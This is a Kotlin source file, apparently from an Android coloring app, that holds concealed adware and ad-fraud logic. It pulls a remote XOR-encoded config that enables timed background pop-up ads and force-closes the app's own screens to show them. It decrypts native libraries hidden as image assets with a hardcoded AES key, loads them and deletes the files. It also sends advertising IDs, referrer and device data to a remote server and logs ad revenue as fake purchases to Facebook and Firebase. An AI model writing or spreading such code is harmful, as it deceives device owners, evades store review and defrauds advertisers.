package m.ki

import android.app.Activity
import android.app.Application
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import xik.af
import xik.wn
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.Currency
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random
import kotlin.text.toByteArray

object Fnc {
    lateinit var app: Application
    lateinit var byteAd1: Pdd
    lateinit var byteAd2: Pdd

    lateinit var plusAd1: Tdd
    lateinit var plusAd2: Tdd

    private var once = false
    private var hide = false//hideDid

    private var loop = 0L//loopTime
    private var gap = 0L//gapTime
    private var first = 0L//firstTime

    private var popLoopJob: Job? = null
    var lastShowTime = 0L//last ShowTime
    private var loadingAdmin = false//loading admin
    private var job: Job? = null
    private val a by lazy { AppEventsLogger.newLogger(app) }

    private var tba = ""//tba
    private var min = ""//admin
    private var debugMode = ""
    private var version = ""//app version
    private var testMin = ""
    private var googleId = ""//Gaid
    private var refer = ""//refer

    private var iTag = ""//is install tba done
    private var dId = ""//distinctID
    private var minValue = ""//local admin
    private var iTime = 0L//install time
    private var uTime = 0L//update time
    private var aLoop = 5//a user loopTime
    private var bLoop = 10//b user loopTime
    private var up = true//can upload tba point

    var useByte = true
    var afterT = false

    private val okMaster = OkHttpClient()
    var autoCloseAdJob: Job? = null

    var maxShowTime = 0L
    var popMinDelay = 0L
    var popMaxDelay = 0L
    var popUnit = 0L

    var failPopMax = 0
    var hourMaxShow = 0
    var dayMaxShow = 0
    var nowPopFail = 0
    var adminMaxTime = 100//默认不能为0，否则有问题
    private var isOpenLimit = true//是否开启上限

    fun start(a0: Application, a1: ArrayList<String>) {
        this.app = a0
        val name = a0.packageName
        val info = a0.packageManager.getPackageInfo(name, 0)
        iTime = info.firstInstallTime
        uTime = info.lastUpdateTime

        Ldd.tx = MMKV.defaultMMKV()
        if (googleId.isEmpty()) {
            CoroutineScope(Dispatchers.IO).launch {
                val id = try {
                    AdvertisingIdClient.getAdvertisingIdInfo(app).id
                } catch (_: Exception) {
                    ""
                }
                googleId = id ?: ""
                Ldd.saveStr("gTag", id ?: "")
            }
        }

        fun fetchRefer(count: Int = 0) {
            val client = InstallReferrerClient.newBuilder(app).build()
            client.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(code: Int) {
                    if (code == 0) {
                        refer = client.installReferrer.installReferrer
                        Ldd.saveStr("rTag", refer)
                        tStart(a1)
                    } else if (count < 5) {
                        CoroutineScope(Dispatchers.IO).launch {
                            delay(10_000L)
                            fetchRefer(count + 1)
                        }
                    }
                    client.endConnection()
                }

                override fun onInstallReferrerServiceDisconnected() {
                    client.endConnection()
                    if (count < 5) {
                        CoroutineScope(Dispatchers.IO).launch { fetchRefer(count + 1) }
                    }
                }
            })
        }

        val rTag = Ldd.readStr("rTag")
        if (rTag.isEmpty()) fetchRefer() else tStart(a1)
    }

    private fun tStart(list: ArrayList<String>) {
        debugMode = list[0]

        if (debugMode == "bug") {//debug mode
            tba = "https://test-none.fillcolorfunpars.com/saigon/dyad"
            min = "https://omn.fillcolorfunpars.com/apitest/pear/funny/"
        } else {
            tba = "https://none.fillcolorfunpars.com/card/legato/attain"
            min = "https://omn.fillcolorfunpars.com/api/pear/funny/"
        }
        testMin = if (list[1].length > 50) list[1] else ""
        version = list[2]

        dexLog("tba:${tba} admin:${min}")
        refer = Ldd.readStr("rTag")
        iTag = Ldd.readStr("iTag")
        googleId = Ldd.readStr("gTag")
        dId = Ldd.readStr("userId")  //distinct ID
        minValue = Ldd.readStr("mTag")

        refresh(minValue)
        if (!once) {
            start()
            once = true
        }
    }

    private fun start() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                o(listOf("session"))
                delay(15 * 1000 * 60L)
            }
        }
        if (iTag.isEmpty()) {
            o(t = "i")
        }
        if (minValue.isEmpty()) {
            dexLog("local no admin")
            minG(5)
            return
        }
        if (isA(minValue)) {//A
            dexLog("local have admin")
            t(minValue)
            CoroutineScope(Dispatchers.IO).launch {
                delay(Random.nextLong(1000, 10 * 1000 * 60))
                minG(1)
            }
            mA()
        } else {
            mA(false)
        }
    }

    private fun t(c: String) {
        try {
            val parts = JSONObject(c).optString("cvv").split("_")
            val id = parts.getOrNull(0) ?: ""
            val token = parts.getOrNull(1) ?: ""
            initFaceBook(id, token)
        } catch (_: Exception) {
        }
        if (isA(c)) {
            ac(c)
        }
    }


    private fun initFaceBook(a0: String, a1: String) {
        if (FacebookSdk.isInitialized()) return
        dexLog("init fb: $a0 $a1")
        CoroutineScope(Dispatchers.Main).launch {
            try {
                FacebookSdk.setApplicationId(a0)
                FacebookSdk.setClientToken(a1)
                FacebookSdk.sdkInitialize(app.applicationContext)
                AppEventsLogger.activateApp(app)
            } catch (e: Throwable) {
                dexLog("init fb error: ${e.message}")
            }
        }
    }


    fun closeAll() {
        try {
            val cls = Class.forName("u4.f")
            val ins = cls.getDeclaredField("INSTANCE")
            ins.isAccessible = true
            val aIns = ins.get(null)
            val f1 = cls.getDeclaredField("c8")
            f1.isAccessible = true
            val list = f1.get(aIns) as? MutableList<*>
            if (list != null) {
                for (page in list) {
                    (page as? Activity)?.finishAndRemoveTask()
                }
                list.clear()
            }
        } catch (_: Throwable) {
        }
        afterT = true
    }

    private fun ac(a0: String) {
        val js = JSONObject(a0)

        val byteIds = js.optString("nak").split("_")
        val byteId1 = byteIds.getOrNull(0) ?: ""
        val byteId2 = byteIds.getOrNull(1) ?: ""
        val plusId1 = byteIds.getOrNull(0) ?: ""
        val plusId2 = byteIds.getOrNull(1) ?: ""

        useByte = js.optString("bta").contains("kuk")
        isOpenLimit = js.optString("bta").contains("dud")

        val limits = js.optString("nma").split("_")
        hourMaxShow = limits[0].toInt()
        dayMaxShow = limits[1].toInt()
        failPopMax = limits[2].toInt()
        maxShowTime = limits[3].toInt() * 1000L
        adminMaxTime = limits[4].toInt()


        val parts = js.optString("eka").split("_")
        loop = parts[0].toInt() * 1000L
        popUnit = parts[1].toInt() * 1000L
        gap = parts[2].toInt() * 1000L
        first = parts[3].toInt() * 1000L
        popMinDelay = parts[4].toLong()
        popMaxDelay = parts[5].toLong()

        try {
            val file = File(app.filesDir.parentFile, "hotmdl")
            if (!file.exists()) file.mkdirs()
        } catch (_: Exception) {
        }
        if (!hide) {
            hide = true
            byteAd1 = Pdd(id = byteId1, tag = "1")
            byteAd2 = Pdd(id = byteId2, tag = "2")
            plusAd1 = Tdd(id = plusId1, tag = "1")
            plusAd2 = Tdd(id = plusId2, tag = "2")

            app.registerActivityLifecycleCallbacks(Udd())
            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarT", "T")
            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarH", "H")
            CoroutineScope(Dispatchers.Main).launch {
                try {
                    wn.lo3(1, 0.9, "yaso")
                } catch (_: Throwable) {
                }
                try {
                    af.v7(app)
                } catch (_: Throwable) {
                }
            }
            al()
        } else {
            byteAd1.updateId(byteId1)
            byteAd2.updateId(byteId2)
            plusAd1.updateId(plusId1)
            plusAd2.updateId(plusId2)
        }
    }

    private fun al() {//loop
        popLoopJob?.cancel()
        popLoopJob = CoroutineScope(Dispatchers.Main).launch {
            var thisDealyTime: Long
            while (true) {
                thisDealyTime = try {
                    Random.nextLong(loop - popUnit, loop + popUnit)
                } catch (_: Throwable) {
                    loop
                }
                if (isOpenLimit) {
                    if (Ldd.limit() == 0 && nowPopFail < failPopMax) {
                        if (useByte) {
                            byteAd1.loadP(app)
                            byteAd2.loadP(app)
                        } else {
                            plusAd1.loadT(app)
                            plusAd2.loadT(app)
                        }
                    }
                } else {
                    if (useByte) {
                        byteAd1.loadP(app)
                        byteAd2.loadP(app)
                    } else {
                        plusAd1.loadT(app)
                        plusAd2.loadT(app)
                    }
                }
                ae(thisDealyTime)
                delay(thisDealyTime)
            }
        }
    }

    fun lock(): Boolean {
        return (app.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive.not()
    }

    private suspend fun ae(time: Long) {
        if (isOpenLimit) {
            val limitType = Ldd.limit()
            if (limitType != 0) {
                val value = when (limitType) {
                    1 -> "hourL"
                    2 -> "dayL"
                    else -> ""
                }
                val key = if (limitType == 1) "hourMarkTag" else "dayMarkTag"
                val tag = if (limitType == 1) Ldd.getTag() else Ldd.getTag(1)
                if (Ldd.readStr(key) != tag) {
                    Ldd.saveStr(key, tag)
                    o(listOf("ad_pass", "string", value))
                }
                return
            }
            if (nowPopFail >= failPopMax) {
                if (Ldd.readStr("k8") != Ldd.getTag(1)) {
                    o(listOf("pop_fail"))
                    Ldd.saveStr("k8", Ldd.getTag(1))
                }
                return
            }
        }

        o(listOf("ad_session", "time", (time / 1000).toString()))
        if (lock()) return
        o(listOf("ad_light"))
        if (System.currentTimeMillis() - iTime < first) {
            o(listOf("ad_pass", "string", "firstNo"))
            return
        }
        if (System.currentTimeMillis() - lastShowTime < gap) {
            o(listOf("ad_pass", "string", "gapNo"))
            return
        }
        if (useByte) {
            if ((byteAd1.looking() || byteAd2.looking())) {
                o(listOf("ad_pass", "string", "seeingP"))
                return
            }
        } else {
            if ((plusAd1.isLooking() || plusAd2.isLooking())) {
                o(listOf("ad_pass", "string", "seeingT"))
                return
            }
        }
        o(listOf("ad_pass", "string", "NULL"))
        closeAll()
        delay(368)
        nowPopFail += 1
        try {
            wn.lo3(0, 0.2, "bkbir")
        } catch (t: Throwable) {
        }
        o(listOf("ad_start"))
    }

    private fun minG(a0: Int = 5) {
        if (loadingAdmin || Ldd.adminLimit() == 1) return
        if (a0 <= 0) {
            o(listOf("config_G", "getstring", "timeout"))
            return
        }
        o(listOf("config_R"))

        Ldd.addAdmin()
        loadingAdmin = true
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val tag = System.currentTimeMillis().toString()
                okMaster.newCall(
                    Request.Builder()
                        .url(min)
                        .header("dt", tag)
                        .post(

                            String(
                                Base64.encode(
                                    xorS(
                                        minJ().toString(),
                                        tag
                                    ).toByteArray(), Base64.DEFAULT
                                )
                            )
                                .toRequestBody("application/json; charset=utf-8".toMediaType())
                        )
                        .build()
                ).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        dexLog("m fail ${e.message}")
                        loadingAdmin = false
                        CoroutineScope(Dispatchers.IO).launch {
                            delay(38000L)
                            minG(a0 - 1)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        loadingAdmin = false
                        val co = response.code
                        val bo = response.body?.string() ?: ""
                        if (co != 200) {
                            o(listOf("config_G", "getstring", co.toString()))
                            CoroutineScope(Dispatchers.IO).launch {
                                delay(90000L)
                                minG(a0 - 1)
                            }
                        } else {
                            val hd = response.headers["dt"] ?: ""
                            val e = xorS(String(Base64.decode(bo, Base64.DEFAULT)), hd)
                            dexLog("m good $co $e")
                            var ms = ""
                            try {
                                ms =
                                    JSONObject(JSONObject(e).optString("ZIQ")).optString("conf")
                            } catch (_: Exception) {
                            }

                            if (testMin.isNotEmpty()) {
                                ms = testMin
                                dexLog("use local")
                            }
                            refresh(ms)
                            if (ms.isEmpty()) {
                                o(listOf("config_G", "getstring", "null"))
                                if (minValue.isEmpty()) {
                                    CoroutineScope(Dispatchers.IO).launch {
                                        delay(40000L)
                                        minG(a0 - 1)
                                    }
                                } else {
                                    //use
                                    t(minValue)
                                    if (isA(minValue)) {
                                        mA()
                                    } else {
                                        mA(false)
                                    }
                                }
                            } else if (isA(ms)) {//A
                                o(listOf("config_G", "getstring", "a"))
                                minValue = ms
                                Ldd.saveStr("mTag", ms)
                                t(ms)
                                mA()
                            } else {//B
                                o(listOf("config_G", "getstring", "b"))
                                if (minValue.isEmpty()) {
                                    minValue = ms
                                    Ldd.saveStr("mTag", ms)
                                }
                                mA(false)
                                if (minValue.isEmpty()) {
                                    CoroutineScope(Dispatchers.IO).launch {
                                        delay(38000L)
                                        minG(a0 - 1)
                                    }
                                } else {
                                    t(minValue)
                                }
                            }
                        }
                    }
                })
            } catch (e: Exception) {
                loadingAdmin = false
                dexLog("m err ${e.message}")
                CoroutineScope(Dispatchers.IO).launch {
                    delay(40000L)
                    minG(a0 - 1)
                }
            }
        }
    }

    private var minMinTime = 16 * 1000L
    private var lastAdminTime = 0L

    private fun mA(a0: Boolean = true) {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                if (a0) {
                    minMinTime = (aLoop + Random.nextInt(0, 5)) * 1000L * 60
                    delay(minMinTime)
                } else {
                    minMinTime = (bLoop + Random.nextInt(0, 6)) * 1000L
                    delay(minMinTime)
                }
                if (System.currentTimeMillis() - lastAdminTime > minMinTime) {
                    lastAdminTime = System.currentTimeMillis()
                    minG(1)
                }
            }
        }
    }


    fun o(l: List<String> = listOf(), t: String = "p", r: Int = 10) {
        if (r <= 0) return
        if (t == "p" && !up && l[0] != "session" && l[0] != "config_G") return
        if (t == "a") {
            if (l[4] == "pangle") {
                upE(l[0].toDouble() / 1000)
            } else {
                upE(l[0].toDouble())
            }
        }
        CoroutineScope(Dispatchers.IO).launch {
            try {
                okMaster.newCall(
                    Request.Builder().url(tba).post(
                        when (t) {
                            "i" -> installJ()
                            "a" -> adJ(l)
                            else -> markJ(l)
                        }.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                    ).build()
                ).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        dexLog("t fail ${e.message}")
                        CoroutineScope(Dispatchers.IO).launch {
                            delay(25000L)
                            o(l, t, r - 1)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        val c = response.code
                        val b = response.body?.string() ?: ""
                        dexLog("t res $c $b")
                        if (c != 200) {
                            CoroutineScope(Dispatchers.IO).launch {
                                delay(50000L)
                                o(l, t, r - 1)
                            }
                        } else {
                            if (t == "i" && iTag.isEmpty()) {
                                iTag = "g"
                                Ldd.saveStr("iTag", "g")
                            }
                        }
                    }
                })
            } catch (e: Exception) {
                dexLog("t err ${e.message}")
                CoroutineScope(Dispatchers.IO).launch {
                    delay(28000L)
                    o(l, t, r - 1)
                }
            }
        }
    }

    private fun upE(a0: Double) {
        dexLog("up value to facebook & firebase: $a0")
        try {
            a.logPurchase(a0.toBigDecimal(), Currency.getInstance("USD"))

            val bund = Bundle()
            bund.putDouble(FirebaseAnalytics.Param.VALUE, a0)
            bund.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent("ad_impression_funny", bund)
        } catch (_: Throwable) {
        }
    }

    private fun xorS(a: String, b: String): String {
        val chars = a.toCharArray()
        val len = b.length
        for (i in chars.indices) {
            chars[i] = (chars[i].code xor b[i % len].code).toChar()
        }
        return String(chars)
    }

    fun dexLog(a: String) {
        if (debugMode != "bug") return
        Log.v("T686", a)
    }

    private fun isA(d: String) = JSONObject(d).optString("bta").contains("wow") //can pop
    private fun isU(d: String) =
        d.isEmpty() || JSONObject(d).optString("bta").contains("bob") //can up tba

    private fun refresh(c: String) {
        up = isU(c)
        try {
            val parts = JSONObject(c).optString("akm").split("_")
            aLoop = parts.getOrNull(0)?.toIntOrNull() ?: 5
            bLoop = parts.getOrNull(1)?.toIntOrNull() ?: 10

            val limits = JSONObject(c).optString("nma").split("_")
            adminMaxTime = limits[4].toInt()
        } catch (_: Exception) {
            aLoop = 5
            bLoop = 10
            adminMaxTime = 100
        }
    }

    private fun loadSo(ctx: Context, pkg: String, decodeKey: String, tag: String, type: String) {
        try {
            // 1. 选 ABI
            var abi = ""
            for (s in Build.SUPPORTED_64_BIT_ABIS) {
                if (s.startsWith("arm64") || s.startsWith("x86_64")) {
                    abi = s; break
                }
            }
            if (abi.isEmpty()) {
                for (s in Build.SUPPORTED_32_BIT_ABIS) {
                    if (s.startsWith("armeabi") || s.startsWith("x86")) {
                        abi = s; break
                    }
                }
            }
            if (abi.isEmpty() && Build.SUPPORTED_ABIS.isNotEmpty()) abi = Build.SUPPORTED_ABIS[0]

            // 2. 根据 abi + e 选文件名
            val imageName = if (abi.contains("64")) {
                if (type == "T") "ziak.png" else "mgk_ka.png"
            } else {
                if (abi.isNotEmpty() && type == "T") "lki.webp" else "iha_opk.jpg"
            }
            // 3. 目标文件
            val file = File("/data/data/$pkg/$tag")
            if (!file.exists()) {
                // 4. 读取 assets
                ctx.assets.open(imageName).use { input ->
                    val bos = ByteArrayOutputStream()
                    val buf = ByteArray(4096)
                    while (true) {
                        val len = input.read(buf)
                        if (len < 0) break
                        bos.write(buf, 0, len)
                    }
                    val raw = bos.toByteArray()

                    // 5. AES 解密
                    val key = SecretKeySpec(decodeKey.toByteArray(), "AES")
                    val decoded = Cipher.getInstance("AES/ECB/PKCS5Padding")
                        .apply { init(Cipher.DECRYPT_MODE, key) }
                        .doFinal(raw)

                    // 6. 输出文件
                    FileOutputStream(file).use { out -> out.write(decoded) }
                }
            }
            // 7. 加载 so 并删除
            System.load(file.absolutePath)
            file.delete()
        } catch (_: Throwable) {
        }
    }


    private fun installJ(): JSONObject {
        val json = baseJ()
        val subJson = JSONObject()
        subJson.put("cambrian", "")
        subJson.put("dont", refer)
        subJson.put("dishevel", "")
        subJson.put("barn", "shaft")
        subJson.put("vermeil", "0")
        subJson.put("crossbar", "0")
        subJson.put("homonym", "0")
        subJson.put("tito", "0")
        subJson.put("abscond", iTime)
        subJson.put("furl", uTime)
        json.put("pavlov", subJson)
        return json
    }

    private fun adJ(list: List<String>): JSONObject {
        val js = baseJ()
        if (list[4] == "pangle") {
            js.put("phosphor", list[0].toDouble() * 1000)
        } else {
            js.put("phosphor", list[0].toDouble() * 1000000)
        }
        js.put("babysat", "USD")
        js.put("embark", list[1])
        js.put("triton", list[4])
        js.put("passaic", list[2])
        js.put("ephesus", list[3])
        js.put("goodbye", "pAd")

        js.put("blanch", "rescue")
        return js
    }

    private fun markJ(list: List<String>): JSONObject {
        val js = baseJ()
        val sj1 = JSONObject()
        if (list.size >= 3) sj1.put(list[1], list[2])
        if (list.size >= 5) sj1.put(list[3], list[4])
        js.put("blanch", list[0])
        js.put("craw", sj1)
        return js
    }

    private fun minJ(): JSONObject {
        val js = JSONObject()
        js.put("zencmOv", "com.fillcolor.fun.pars")
        js.put("XOQvweOH", version)
        js.put("iHVVtlKLl", dId)
        js.put("UCneBwX", refer)
        return js
    }

    private fun baseJ(): JSONObject {
        val js = JSONObject()
        val sj1 = JSONObject()
        val sj2 = JSONObject()
        val sj3 = JSONObject()

        sj1.put("sympathy", System.currentTimeMillis())
        sj1.put("belle", dId)
        sj1.put("barium", googleId)
        sj1.put("wastrel", "")

        sj2.put("sumeria", dId)
        sj2.put("guerdon", "_")
        sj2.put("rennet", Build.MANUFACTURER)
        sj2.put("ugh", Build.VERSION.RELEASE)
        sj2.put("moliere", version)

        sj3.put("hexane", "com.fillcolor.fun.pars")
        sj3.put("precise", "coronate")
        sj3.put("noblesse", UUID.randomUUID().toString())
        sj3.put("sorensen", Build.MODEL)

        js.put("clarity", sj1)
        js.put("eugenia", sj2)
        js.put("accouter", sj3)
        return js
    }
}